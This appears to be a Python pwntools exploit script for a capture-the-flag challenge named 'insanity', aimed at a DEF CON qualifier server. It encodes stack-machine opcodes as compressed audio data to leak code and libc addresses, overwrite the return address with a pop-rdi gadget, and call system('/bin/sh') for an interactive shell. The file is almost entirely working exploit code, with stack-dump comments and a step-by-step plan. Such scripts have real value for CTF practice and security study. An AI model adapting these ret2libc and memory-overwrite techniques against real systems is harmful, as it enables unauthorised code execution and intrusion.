from pwn import *
import zlib

with open('data/insanity_pad.raw', 'rb') as f:
    insanity_data = f.read()

with open('data/insane.raw', 'rb') as f:
    insane_data = f.read()


def encode(data):
    d = b''
    for i in range(len(data)//2):
        d += chr(ord(data[i*2+1]) ^ 0x80)
    return d

insanity_encoded = encode(insanity_data)
insane_encoded = encode(insane_data)

cache = {}


def repeated(n):
    if n not in cache:
        data = insanity_encoded * n + insane_encoded
        data = zlib.compress(data)
        cache[n] = data
    return cache[n]

'''
0x00007ffd1a592a60 <- $rsp

...

0x00007ffd1a592b40|+0xe0: 0x80007ffd1a592b40 | &arr, arr[0]
0x00007ffd1a592b48|+0xe8: 0x80005586bd52a7c4 | hyp+4, arr[1]
0x00007ffd1a592b50|+0xf0: 0x01
0x00007ffd1a592b58|+0xf8: 0x01
0x00007ffd1a592b60|+0x100: 0x02
0x00007ffd1a592b68|+0x108: 0x00

...

0x00007ffd1a5d4ad8|+0x00: 0x00007f112ea1b830 -> 0x7f112ea1b830  <__libc_start_main+240>  mov edi, eax  <- ret
0x00007ffd1a5d4ae0|+0x08: 0x00
0x00007ffd1a5d4ae8|+0x10: 0x00007ffd1a5d4bb8
0x00007ffd1a5d4af0|+0x18: 0x0100000000
0x00007ffd1a5d4af8|+0x20: 0x00005586b8473ef0  <- main
'''


# p = process('./insanity')
p = remote('insanity_thereisnorightandwrongtheresonlyfunandboring.quals.shallweplayaga.me', 18888)

payload = []


def append_all(t):
    for c in t:
        payload.append(c)


def top_set(num):
    X = 15
    cnt = 0
    while num > X:
        cnt += 1
        payload.append(10 + num % X)
        payload.append(10 + X)
        num /= X
    payload.append(10 + num)
    append_all((4, 2)*cnt)


def flip_address_bit():
    top_set(0x4000000000000000)
    append_all((2,))
    top_set(0x4000000000000000)
    append_all((2,))

'''
arr[33783] - main
arr[33779] - ret

1. load main addr
2. overwrite arr[1] with leaked code base
3. load libc addr from .got
4. adjust offset to system
5. Using gadget 0x128d(pop rdi; ret), call system
'''

# Step 1
top_set(33783)
append_all((6, 0))

# Step 2
top_set(0xef0)
append_all((3,))
top_set(2)
append_all((7,))  # arr[2] = code base
top_set(2)
append_all((6, 0))
flip_address_bit()
top_set(1)
append_all((7,))  # arr[1] = code base with flag

# Step 3
top_set(0x203078 / 8)  # alarm
append_all((6, 1))

# Step 4
top_set(0xC0CD0 - 0x46640)  # system
append_all((3,))

# Step 5
top_set(33779 + 2)  # arr[33781] = system
append_all((7,))
top_set(2)
append_all((6, 0))
top_set(0x128d)
append_all((2,))
top_set(33779)  # arr[33779] = pop rdi; ret
append_all((7,))
top_set(33781)
append_all((6, 0))
top_set(0x17CCDB - 0x46640)  # /bin/sh
append_all((2,))
top_set(33780)  # arr[33780] = /bin/sh
append_all((7,))


print payload

g = log.progress('Working: ')
for i in range(len(payload)):
    repeat = payload[i]
    data = repeated(repeat)
    p.send(p32(len(data)))
    p.send(data)
    p.recvn(1)
    g.status('%d / %d' % (i+1, len(payload)))
g.success('Complete!')

p.send(p32(0))

p.interactive()
